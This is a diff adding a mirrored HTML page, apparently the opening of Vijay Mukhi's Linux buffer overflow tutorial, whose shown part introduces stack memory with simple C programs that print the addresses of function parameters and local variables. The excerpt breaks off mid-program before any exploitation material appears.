@@ -1,0 +1,3218 @@
+<html xmlns:v="urn:schemas-microsoft-com:vml"
+xmlns:o="urn:schemas-microsoft-com:office:office"
+xmlns:w="urn:schemas-microsoft-com:office:word"
+xmlns="http://www.w3.org/TR/REC-html40">
+
+
+<!-- Mirrored from www.vijaymukhi.com/security/linux/buffoverflowl.htm by HTTrack Website Copier/3.x [XR&CO'2014], Fri, 11 Oct 2024 14:40:07 GMT -->
+<head>
+<meta http-equiv=Content-Type content="text/html; charset=windows-1252">
+<meta name=ProgId content=Word.Document>
+<meta name=Generator content="Microsoft Word 9">
+<meta name=Originator content="Microsoft Word 9">
+<link rel=File-List href="buffoverflowl_files/filelist.xml">
+<title>Buff Overflow Linux</title>
+<!--[if gte mso 9]><xml>
+ <o:DocumentProperties>
+  <o:Author>Vijay Mukhi</o:Author>
+  <o:LastAuthor>Mr. Vijay Mukhi</o:LastAuthor>
+  <o:Revision>8</o:Revision>
+  <o:TotalTime>3</o:TotalTime>
+  <o:LastPrinted>2004-06-08T10:01:00Z</o:LastPrinted>
+  <o:Created>2004-06-07T12:55:00Z</o:Created>
+  <o:LastSaved>2004-03-29T11:49:00Z</o:LastSaved>
+  <o:Pages>16</o:Pages>
+  <o:Words>4403</o:Words>
+  <o:Characters>25102</o:Characters>
+  <o:Company>VMCI</o:Company>
+  <o:Lines>209</o:Lines>
+  <o:Paragraphs>50</o:Paragraphs>
+  <o:CharactersWithSpaces>30827</o:CharactersWithSpaces>
+  <o:Version>9.2720</o:Version>
+ </o:DocumentProperties>
+</xml><![endif]--><!--[if gte mso 9]><xml>
+ <w:WordDocument>
+  <w:DrawingGridHorizontalSpacing>0 pt</w:DrawingGridHorizontalSpacing>
+  <w:DrawingGridVerticalSpacing>0 pt</w:DrawingGridVerticalSpacing>
+  <w:DisplayHorizontalDrawingGridEvery>0</w:DisplayHorizontalDrawingGridEvery>
+  <w:DisplayVerticalDrawingGridEvery>0</w:DisplayVerticalDrawingGridEvery>
+  <w:UseMarginsForDrawingGridOrigin/>
+  <w:DrawingGridHorizontalOrigin>0 pt</w:DrawingGridHorizontalOrigin>
+  <w:DrawingGridVerticalOrigin>0 pt</w:DrawingGridVerticalOrigin>
+ </w:WordDocument>
+</xml><![endif]-->
+<style>
+<!--
+ /* Font Definitions */
+@font-face
+	{font-family:"MS Mincho";
+	panose-1:0 0 0 0 0 0 0 0 0 0;
+	mso-font-alt:"\FF2D\FF33 \660E\671D";
+	mso-font-charset:128;
+	mso-generic-font-family:roman;
+	mso-font-format:other;
+	mso-font-pitch:fixed;
+	mso-font-signature:1 134676480 16 0 131072 0;}
+@font-face
+	{font-family:"Trebuchet MS";
+	panose-1:2 11 6 3 2 2 2 2 2 4;
+	mso-font-charset:0;
+	mso-generic-font-family:swiss;
+	mso-font-pitch:variable;
+	mso-font-signature:7 0 0 0 19 0;}
+@font-face
+	{font-family:"\@MS Mincho";
+	panose-1:0 0 0 0 0 0 0 0 0 0;
+	mso-font-charset:128;
+	mso-generic-font-family:roman;
+	mso-font-format:other;
+	mso-font-pitch:fixed;
+	mso-font-signature:1 134676480 16 0 131072 0;}
+@font-face
+	{font-family:"Luxi Sans";
+	mso-font-alt:Arial;
+	mso-font-charset:0;
+	mso-generic-font-family:swiss;
+	mso-font-pitch:variable;
+	mso-font-signature:0 0 0 0 0 0;}
+@font-face
+	{font-family:"HG Mincho Light J";
+	mso-font-charset:0;
+	mso-generic-font-family:auto;
+	mso-font-pitch:variable;
+	mso-font-signature:0 0 0 0 0 0;}
+ /* Style Definitions */
+p.MsoNormal, li.MsoNormal, div.MsoNormal
+	{mso-style-parent:"";
+	margin:0in;
+	margin-bottom:.0001pt;
+	mso-pagination:widow-orphan;
+	mso-hyphenate:none;
+	font-size:12.0pt;
+	mso-bidi-font-size:10.0pt;
+	font-family:"Times New Roman";
+	mso-fareast-font-family:"Times New Roman";}
+h1
+	{mso-style-next:Normal;
+	margin:0in;
+	margin-bottom:.0001pt;
+	mso-pagination:widow-orphan;
+	page-break-after:avoid;
+	mso-outline-level:1;
+	font-size:10.5pt;
+	mso-bidi-font-size:12.0pt;
+	font-family:"Times New Roman";
+	mso-font-kerning:0pt;
+	font-weight:normal;
+	text-decoration:underline;
+	text-underline:single;}
+h2
+	{mso-style-next:Normal;
+	margin-top:12.0pt;
+	margin-right:0in;
+	margin-bottom:3.0pt;
+	margin-left:0in;
+	text-indent:0in;
+	mso-pagination:widow-orphan;
+	page-break-after:avoid;
+	mso-outline-level:2;
+	mso-list:l0 level2 lfo2;
+	mso-hyphenate:none;
+	font-size:14.0pt;
+	mso-bidi-font-size:10.0pt;
+	font-family:Arial;
+	mso-bidi-font-family:"Times New Roman";
+	mso-bidi-font-weight:normal;
+	font-style:italic;
+	mso-bidi-font-style:normal;}
+h6
+	{mso-style-next:Normal;
+	margin-top:12.0pt;
+	margin-right:0in;
+	margin-bottom:3.0pt;
+	margin-left:0in;
+	mso-pagination:widow-orphan;
+	mso-outline-level:6;
+	font-size:11.0pt;
+	font-family:"Times New Roman";}
+p.MsoFooter, li.MsoFooter, div.MsoFooter
+	{margin:0in;
+	margin-bottom:.0001pt;
+	mso-pagination:widow-orphan;
+	mso-hyphenate:none;
+	tab-stops:center 3.0in right 6.0in;
+	font-size:12.0pt;
+	mso-bidi-font-size:10.0pt;
+	font-family:"Times New Roman";
+	mso-fareast-font-family:"Times New Roman";}
+p.MsoBodyText, li.MsoBodyText, div.MsoBodyText
+	{margin-top:0in;
+	margin-right:0in;
+	margin-bottom:6.0pt;
+	margin-left:0in;
+	mso-pagination:widow-orphan;
+	mso-hyphenate:none;
+	font-size:12.0pt;
+	mso-bidi-font-size:10.0pt;
+	font-family:"Times New Roman";
+	mso-fareast-font-family:"Times New Roman";}
+a:link, span.MsoHyperlink
+	{color:blue;
+	text-decoration:underline;
+	text-underline:single;}
+a:visited, span.MsoHyperlinkFollowed
+	{color:purple;
+	text-decoration:underline;
+	text-underline:single;}
+p.MsoPlainText, li.MsoPlainText, div.MsoPlainText
+	{margin:0in;
+	margin-bottom:.0001pt;
+	mso-pagination:widow-orphan;
+	font-size:10.0pt;
+	font-family:"Courier New";
+	mso-fareast-font-family:"Times New Roman";}
+p.Heading, li.Heading, div.Heading
+	{mso-style-name:Heading;
+	mso-style-next:"Body Text";
+	margin-top:12.0pt;
+	margin-right:0in;
+	margin-bottom:6.0pt;
+	margin-left:0in;
+	mso-pagination:widow-orphan;
+	page-break-after:avoid;
+	mso-hyphenate:none;
+	font-size:14.0pt;
+	mso-bidi-font-size:10.0pt;
+	font-family:"Luxi Sans";
+	mso-fareast-font-family:"HG Mincho Light J";
+	mso-bidi-font-family:"Times New Roman";}
+p.Heading2, li.Heading2, div.Heading2
+	{mso-style-name:Heading2;
+	mso-style-parent:"Heading 2";
+	margin-top:.75pt;
+	margin-right:.75pt;
+	margin-bottom:3.0pt;
+	margin-left:0in;
+	text-align:justify;
+	text-indent:0in;
+	mso-pagination:widow-orphan;
+	page-break-after:avoid;
+	mso-outline-level:2;
+	mso-list:l0 level2 lfo2;
+	mso-hyphenate:none;
+	font-size:10.0pt;
+	font-family:"Trebuchet MS";
+	mso-fareast-font-family:"Times New Roman";
+	mso-bidi-font-family:"Times New Roman";
+	color:black;
+	font-weight:bold;
+	mso-bidi-font-weight:normal;
+	font-style:italic;
+	mso-bidi-font-style:normal;}
+p.WW-PlainText, li.WW-PlainText, div.WW-PlainText
+	{mso-style-name:"WW-Plain Text";
+	margin:0in;
+	margin-bottom:.0001pt;
+	mso-pagination:widow-orphan;
+	mso-hyphenate:none;
+	font-size:10.0pt;
+	font-family:"Courier New";
+	mso-fareast-font-family:"Times New Roman";
+	mso-bidi-font-family:"Times New Roman";}
+span.WW-Absatz-Standardschriftart
+	{mso-style-name:WW-Absatz-Standardschriftart;
+	mso-style-parent:"";}
+span.WW-DefaultParagraphFont
+	{mso-style-name:"WW-Default Paragraph Font";
+	mso-style-parent:"";}
+ /* Page Definitions */
+@page
+	{mso-footnote-position:beneath-text;}
+@page Section1
+	{size:8.5in 11.0in;
+	margin:.5in .5in .5in .5in;
+	mso-header-margin:.5in;
+	mso-footer-margin:.5in;
+	mso-page-numbers:229;
+	mso-even-footer:url("buffoverflowl_files/header.html") ef1;
+	mso-footer:url("buffoverflowl_files/header.html") f1;
+	mso-paper-source:0;}
+div.Section1
+	{page:Section1;}
+ /* List Definitions */
+@list l0
+	{mso-list-id:1;
+	mso-list-template-ids:1;}
+@list l0:level1
+	{mso-level-number-format:none;
+	mso-level-suffix:none;
+	mso-level-text:"";
+	mso-level-tab-stop:none;
+	mso-level-number-position:left;
+	margin-left:0in;
+	text-indent:0in;}
+@list l0:level2
+	{mso-level-number-format:none;
+	mso-level-suffix:none;
+	mso-level-text:"";
+	mso-level-tab-stop:none;
+	mso-level-number-position:left;
+	margin-left:0in;
+	text-indent:0in;}
+@list l0:level3
+	{mso-level-number-format:none;
+	mso-level-suffix:none;
+	mso-level-text:"";
+	mso-level-tab-stop:none;
+	mso-level-number-position:left;
+	margin-left:0in;
+	text-indent:0in;}
+@list l0:level4
+	{mso-level-number-format:none;
+	mso-level-suffix:none;
+	mso-level-text:"";
+	mso-level-tab-stop:none;
+	mso-level-number-position:left;
+	margin-left:0in;
+	text-indent:0in;}
+@list l0:level5
+	{mso-level-number-format:none;
+	mso-level-suffix:none;
+	mso-level-text:"";
+	mso-level-tab-stop:none;
+	mso-level-number-position:left;
+	margin-left:0in;
+	text-indent:0in;}
+@list l0:level6
+	{mso-level-number-format:none;
+	mso-level-suffix:none;
+	mso-level-text:"";
+	mso-level-tab-stop:none;
+	mso-level-number-position:left;
+	margin-left:0in;
+	text-indent:0in;}
+@list l0:level7
+	{mso-level-number-format:none;
+	mso-level-suffix:none;
+	mso-level-text:"";
+	mso-level-tab-stop:none;
+	mso-level-number-position:left;
+	margin-left:0in;
+	text-indent:0in;}
+@list l0:level8
+	{mso-level-number-format:none;
+	mso-level-suffix:none;
+	mso-level-text:"";
+	mso-level-tab-stop:none;
+	mso-level-number-position:left;
+	margin-left:0in;
+	text-indent:0in;}
+@list l0:level9
+	{mso-level-number-format:none;
+	mso-level-suffix:none;
+	mso-level-text:"";
+	mso-level-tab-stop:none;
+	mso-level-number-position:left;
+	margin-left:0in;
+	text-indent:0in;}
+ol
+	{margin-bottom:0in;}
+ul
+	{margin-bottom:0in;}
+-->
+</style>
+</head>
+
+<body lang=EN-US link=blue vlink=purple style='tab-interval:.5in'>
+
+<div class=Section1>
+
+<table border=1 cellspacing=0 cellpadding=0 width="99%" bgcolor="#eeeeff"
+ style='width:99.54%;background:#EEEEFF;border-collapse:collapse;border:none;
+ mso-border-alt:solid windowtext .5pt;mso-padding-alt:0in 5.4pt 0in 5.4pt'>
+ <tr style='height:15.1pt'>
+  <td width="100%" valign=top style='width:100.0%;border:solid windowtext .5pt;
+  padding:0in 5.4pt 0in 5.4pt;height:15.1pt'>
+  <h6 align=center style='margin:0in;margin-bottom:.0001pt;text-align:center;
+  page-break-after:avoid'><span style='mso-bidi-font-size:10.0pt;color:#000066;
+  mso-text-raise:3.0pt;letter-spacing:1.0pt'>Stack Management – Buffer Overflow
+  - Linux</span><sup><o:p></o:p></sup></h6>
+  </td>
+ </tr>
+</table>
+
+<p class=MsoNormal><sup><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></sup></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>Security is one of the
+fastest-growing areas in information technology management. Denial Of Service,
+Buffer Overflows, Email viruses etc have become general terms in today's info
+world. There may not be a single computer user world over who has not been hit
+by these and many more attacks. Therefore, recently a lot of emphasis is laid
+on securing the computer systems from intruders and viruses as the effects of
+these attacks can be so drastic and thus irreparable. <o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>In our papers, we will look
+at demystifying these grave attacks, from the coder's point of view. Our belief
+is that to understand these attacks, one needs to be in the shoes of the
+hackers/crackers. And mind you, every hacker/cracker is a born programmer. We
+start with the assumption that you are well-versed with the basics of the C
+programming language. Nevertheless, we will re-revise some basic concepts and
+simultaneously learn assembler too. We can go on and on but we'd rather take a
+break and start hacking. <o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'><span style="mso-spacerun:
+yes"> </span><o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>We start our journey with
+the vulnerability of buffer overflow<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>Buffer overflow technically
+means an overflow of the buffer. Every program is allocated some space or given
+buffer area in which it can write. A Buffer overflow occurs when the program
+spills over this buffer or tries to write in the area it is not supposed to.
+This allows an intruder to overwrite the existing instruction in that area,
+thereupon gaining full control over the system. However, before we understand
+the mechanism of this attack, we need to be well versed with memory management,
+a few concepts of stack and heap memory area. <o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>Stack Memory<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>The programs given below
+give an analysis of memory allocations when a program is loaded.<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>a1.c<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>main()<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>{<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>abc(1,2);<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>pqr(3,4);<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>xyz(5,6);<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>abc(7,8);<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>}<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>abc(int i, int j)<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>{<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>printf(&quot;%p %p
+abc\n&quot;,&amp;i,&amp;j);<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>}<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>pqr(int x, int y)<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>{<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>printf(&quot;%p %p
+pqr\n&quot;,&amp;x,&amp;y);<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>}<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>xyz(int i, int j)<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>{<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>printf(&quot;%p %p
+xyz\n&quot;,&amp;i,&amp;j);<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>}<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>gcc -o a1 a1.c<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>./a1<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>Output<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>0xbffff900 0xbffff904 abc<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>0xbffff900 0xbffff904 pqr<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>0xbffff900 0xbffff904 xyz<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>0xbffff900 0xbffff904 abc<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>The above program at first
+glance may seem simplistic, but it is our first cut at learning internals. We
+are calling three functions abc, pqr and xyz with two parameters each. The two
+parameters in functions abc and xyz are named as i and j and for function pqr,
+the name is changed to x and y. <o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>The program simply displays
+the addresses of parameters in each function. What is noteworthy here is that
+all functions display the same addresses for their parameters. Thus, it can be
+safely stated that the parameters to each function begin at the same place in
+memory. As in, for function abc, parameters i and j have been allocated the
+same memory locations as that of p and q for function pqr. <o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>Thus, memory allocated for
+parameters of function is always the same for every function. Meaning to say,
+that there is no permanent memory allocated for function parameters. <o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>a1.c<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>main()<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>{<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>abc();<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>pqr();<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>xyz();<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>abc();<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>}<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>abc()<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>{<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>int i,j;<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>printf(&quot;%p %p
+abc\n&quot;,&amp;i,&amp;j);<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>}<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>pqr()<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>{<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>int k,l;<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>printf(&quot;%p %p
+pqr\n&quot;,&amp;k,&amp;l);<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>}<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>xyz()<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>{<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>int i,j;<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>printf(&quot;%p %p
+xyz\n&quot;,&amp;i,&amp;j);<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>}<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>Output<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>0xbfffe004 0xbfffe000 abc<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>0xbfffe004 0xbfffe000 pqr<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>0xbfffe004 0xbfffe000 xyz<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>0xbfffe004 0xbfffe000 abc<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>The next example is a slightly
+modified version. The functions abc, pqr and xyz have remained the same but
+they do not accept parameters anymore. Instead, variables are created within
+these functions. Nevertheless, like before, all the printf's display identical
+addresses. This simply reassures the belief that local variables in a function
+are allocated the same address each time a function is called. <o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>The technicality here is
+that when a function exits out, all the memory allocated to it is given to the
+next function to be called. Thus, functions are given volatile memory, as in,
+the memory allocated to it is reused by another function. Also, variable names
+have no meaning; it is the addresses assigned to these variables that hold
+value.<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>a1.c<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>main()<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>{<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>abc(1,2);<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>pqr(3,4);<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>xyz(5,6);<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>abc(7,8);<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>}<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
